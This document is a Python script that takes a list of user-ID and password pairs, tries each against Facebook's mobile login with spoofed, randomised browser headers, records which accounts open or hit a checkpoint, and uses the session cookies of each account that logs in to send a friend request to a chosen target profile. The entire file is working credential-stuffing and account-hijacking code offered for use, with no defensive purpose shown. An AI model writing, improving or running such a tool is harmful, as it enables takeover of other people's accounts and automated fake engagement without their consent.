import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
loop=0
oks=[]
cps=[]
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#https://www.facebook.com/  /posts/pfbid02mQiK8tfSuCMyEhfur3qWDpa7n45zTdV5Syxo4pSpsLeTuwzMq4jMyexUcHWycAJRl/?app=fbl
try:
	import progress
	from progress.bar import Bar
except ModuleNotFoundError:
	os.system('pip install progress')
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
#from time import sleep
from progress.bar import Bar
from time import sleep as waktu



def follow(session,coki,ids1):
	session.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	r = sop(session.get('https://mbasic.facebook.com/profile.php?id='+ids1, cookies={'cookie': coki}).text, 'html.parser')
	get = r.find('a', string='Add Friend').get('href')
	session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
	print ("follow sent successful")
	
	
def clear():
	os.system("clear")
def linex():
        print(50*'_')
def File():
	clear()
	file = input(' Put file path\033[1;37m: ')
	ids1 = input(' Put uid\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		exit(' File location not found ')
	linex()
	with ThreadPool(max_workers=0) as crack_submit:
		tl = str(len(fo))
		clear()
		
		print ("Total Ids = "+tl)
		linex()
		print("")
		for user in fo:
			uid = user.split('|')[0]
			pwx = user.split('|')[1]
			crack_submit.submit(kcrack,uid,pwx,tl,ids1)
	print("")
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	menu()



	
def kcrack(uid,pwx,tl,ids1):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in range(1):
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":pwx,
            "login":"Log In"}
            devices = ["iPhone", "Samsung", "Nexus", "Pixel", "iPad", "Surface", "Kindle"]
            browsers = ["Chromium", "Not=A?Brand"]
            platforms = ["Android", "Windows", "MacOS", "Linux"]
    
            header_freefb = {
            "authority": 'mbasic.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            "origin": 'https://mbasic.facebook.com',
            "referer": 'https://mbasic.facebook.com/',
            "sec-ch-ua": f'"{random.choice(browsers)}";v="{str(random.randint(1,20)) + "." + str(random.randint(0,10))}"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": f'"{random.choice(platforms)}"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": f'Mozilla/5.0 ({random.choice(platforms)} {random.randint(1,20)}; {random.choice(devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(1,20)) + "." + str(random.randint(0,10))} Mobile Safari/537.36'}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print ("ok")
                follow(session,coki,ids1)
                #open('okids.txt', 'a').write( uid+'|'+pwx+' \n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                
                print('\r\r\33[1;30m[SaiMun-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                
                cps.append(uid)
                break
            else:
                print ("not working")
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
    	time.sleep(10)
    pass


File()